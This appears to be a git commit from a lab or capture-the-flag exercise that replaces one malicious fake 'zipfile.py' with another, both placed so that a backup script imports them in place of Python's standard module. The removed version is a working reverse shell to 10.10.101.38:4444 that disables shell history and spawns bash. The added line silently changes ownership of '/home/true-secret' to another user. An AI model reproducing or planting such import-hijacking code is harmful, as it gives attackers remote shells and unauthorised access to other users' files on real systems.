4683070a78c6471d0c73028dce105d633da357d0
Théa Gory--Lauret <thea.gory-lauret@epitech.eu>
2024-04-05 01:26:02 +0400

    [UPDATE] zipfile for backup.py

--- zipfile.py
+++ zipfile.py
@@ -1,27 +1,3 @@
 import os
-import pty
-import socket
 
-lhost = "10.10.101.38"
-lport = 4444
-
-ZIP_DEFLATED = 0
-
-class ZipFile:
-    def close(*args):
-        return
-
-    def write(*args):
-        return
-
-    def __init__(self, *args):
-        return
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((lhost, lport))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-os.putenv("HISTFILE",'/dev/null')
-pty.spawn("/bin/bash")
-s.close()
+os.system('chown cave-of-miracles.cave-of-miracles /home/true-secret')
